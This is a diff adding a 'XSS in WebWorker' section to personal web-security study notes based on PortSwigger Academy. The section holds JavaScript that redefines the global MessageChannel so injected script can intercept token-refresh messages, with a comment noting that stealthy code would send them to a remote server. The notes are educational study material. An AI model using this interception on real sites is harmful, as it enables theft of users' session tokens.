@@ -39,6 +39,46 @@ based on [portswigger academy](https://portswigger.net/web-security/cross-site-s
 
 #todo 
 ...
+## XSS in WebWorker 
+when the web worker handles token refresh functionality dynamicaly 
+- [the original article -> Why avoiding LocalStorage for tokens is the wrong solution](https://pragmaticwebsecurity.com/articles/oauthoidc/localstorage-xss.html) 
+
+```javascript
+// Keep a reference to the original MessageChannel
+window.MyMessageChannel = MessageChannel;
+
+// Redefine the global MessageChannel
+MessageChannel = function() {
+    // Create a legitimate channel
+    let wrappedChannel = new MyMessageChannel();
+
+    // Redefine what ports mean
+    let wrapper = {
+        port1: {
+            myOnMessage: null,
+            postMessage: function(msg, list) {
+                wrappedChannel.port1.postMessage(msg, list);
+            },
+            set onmessage (val) {
+                // Defining a setter for "onmessage" so we can intercept messages
+                this.myOnMessage = val;
+            }
+        },
+        port2: wrappedChannel.port2
+    }
+    
+    // Add handlers to legitimate channel
+    wrappedChannel.port1.onmessage = function(e) {
+        // Stealthy code would not log, but send to a remote server
+        console.log(`Intercepting message from port 1 (${e.data})`)
+        console.log(e.data);
+        wrapper.port1.myOnMessage(e);
+    }
+
+    // Return the redefined channel
+    return wrapper;
+}
+```
 
 ---
 # exploits
@@ -66,3 +106,5 @@ based on [portswigger academy](https://portswigger.net/web-security/cross-site-s
 
 [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) #todo
 [CSP(content-security-policy)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) #todo
+
+
